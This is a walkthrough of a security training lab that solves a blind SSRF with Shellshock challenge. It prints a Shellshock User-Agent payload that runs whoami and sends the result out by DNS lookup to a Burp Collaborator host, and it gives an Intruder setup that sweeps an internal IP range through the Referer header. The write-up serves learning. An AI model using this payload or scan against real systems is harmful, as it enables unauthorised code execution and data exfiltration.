Lab: Blind SSRF with Shellshock exploitation
Difficulty: Expert

This lab was all about chaining two things:

Blind SSRF via a Referer header

Shellshock RCE to get the OS username

The end goal is to hit an internal server in the 192.168.0.X range, trigger Shellshock, and exfiltrate the result (the username) using a DNS query to Burp Collaborator.

Let’s walk through it.

1. Scoping out the SSRF

So first thing, I fired up Burp Suite and made sure the lab domain was in scope.
Then I visited a product page and watched what happened.

Sure enough, every time you visit a product, the backend makes an HTTP request to the URL in the Referer header. Classic SSRF spot.

I checked the Burp Collaborator tab, and I was already seeing some hits from the backend trying to fetch that Referer. Even better: the User-Agent header I sent showed up in the logs — which means we can use it as an injection point.

2. Planning the payload

Since the backend is making the request, we can inject a Shellshock payload into the User-Agent header and aim it at an internal server.

The idea with Shellshock is to abuse how Bash parses function definitions in headers like this:


User-Agent: () { :; }; [my command here]
So I generated a Burp Collaborator domain and built this payload:

() { :; }; /usr/bin/nslookup $(whoami).your-collaborator-id.burpcollaborator.net
This will try to resolve a DNS query that includes the current OS username — which we’ll see in the Collaborator logs.

3. Setting up Intruder for the blind scan

Next, I sent a product page request to Intruder.
I replaced the User-Agent header with the full Shellshock payload above.
Then I changed the Referer to:


http://192.168.0.1:8080
Then I highlighted the 1 (the last octet) in the IP and marked it as the payload position.

Under Payloads:

Type: Numbers

From: 1

To: 255

Step: 1

Started the attack.

4. Watching for the callback

Now came the waiting game.

Back in the Burp Collaborator tab, I clicked Poll now a few times.

Eventually, I saw a DNS interaction. In the subdomain of the query, it showed something like:


carlos.your-collaborator-id.burpcollaborator.net
That carlos part? That’s the OS user the command ran as.

5. Wrapping up

I took that username (carlos) and submitted it.
Lab solved.

Takeaways

SSRF from Referer headers can be super dangerous if internal services are reachable.

Shellshock is still fun — and still nasty if Bash is involved.

Blind SSRF can be painful without a way to exfiltrate data. Collaborator is perfect for that.
